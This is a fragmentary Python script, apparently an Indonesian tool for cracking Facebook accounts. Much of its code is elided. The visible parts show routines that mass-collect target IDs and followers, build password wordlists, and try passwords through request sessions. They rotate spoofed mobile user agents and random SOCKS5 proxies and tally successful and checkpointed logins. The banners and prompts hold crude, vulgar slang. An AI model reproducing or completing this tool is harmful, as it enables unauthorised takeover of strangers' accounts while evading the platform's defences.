...
def banner():
    ...
    {m}•{k}•{h}•{sir} 😎WELCOME TO SC PARIZ HERMAWAN😎 {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t18 😋Pariz : [green]Hermawan😋[white] 18+'))
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> Mau Berapa Target Sayang ? : '))
	except ValueError:
...
def dump_pengikut():
	...
	pil = input('>> Masukkan Idz Target Nya Syg : ')
	try:
...
#		method.append('touch')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal kumaha sia\n[[cyan]•[white]] Contoh :[green] syg,kamu,najis[white] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Ngentod Mantan {m}•{k}•{h}•{x} <<<<< ')
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.flush()
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.5.0.6'
	ua2 = 'Mozilla/5.0 (Linux; Android 9; Infinix X652C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
...
def crackfree(idf,pwv):
	...
	sys.stdout.flush()
	ua = 'Mozilla/5.0 (Linux; Android 11; M2103K19I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36'
	ua2 = 'Mozilla/5.0 (Linux; Android 11; 21061119AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
...
def cracktouch(idf,pwv):
	...
	ua = 'Mozilla/5.0 (Linux; Android 11; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'
	ua2 = 'Mozilla/5.0 (Linux; Android 12; CPH2135) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'
	ses = requests.Session()
...
def crackmbasic(idf,pwv):
	...
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Mobile Safari/537.36'
	ua2 = 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
